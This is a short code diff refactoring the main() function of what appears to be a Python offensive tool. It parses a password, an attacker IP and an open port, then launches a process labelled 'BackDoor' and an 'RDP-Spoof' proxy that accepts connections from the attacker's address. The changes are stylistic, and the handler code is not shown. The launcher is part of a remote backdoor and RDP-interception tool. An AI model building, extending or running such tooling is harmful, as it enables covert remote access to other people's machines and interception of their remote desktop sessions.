@@ -27,18 +27,19 @@ def main():
 
 	(options, args) = parser.parse_args()
 
-	if (options.password == None) or (options.attacker_ip == None) or (options.open_port == None):
+	if (
+		options.password is None
+		or options.attacker_ip is None
+		or options.open_port is None
+	):
 		parser.print_help()
 		return 0
 
 	# Defines acceptable proxy communication address
 	CONNECTION_CONFIG = {"attackerIPv4": options.attacker_ip}
 
-	# List containing handles to all the processes we create
-	procList = []
-
 	backdoorProc = Process(target=ConnectionsHandler, name="BackDoor", args=(options.open_port, options.password,))
-	procList.append(backdoorProc)
+	procList = [backdoorProc]
 	backdoorProc.start()
 
 	rdpSpoofProc = Process(target=ProxyHandler, name="RDP-Spoof", args=(RDP_PROXY_MODE, CONNECTION_CONFIG,))
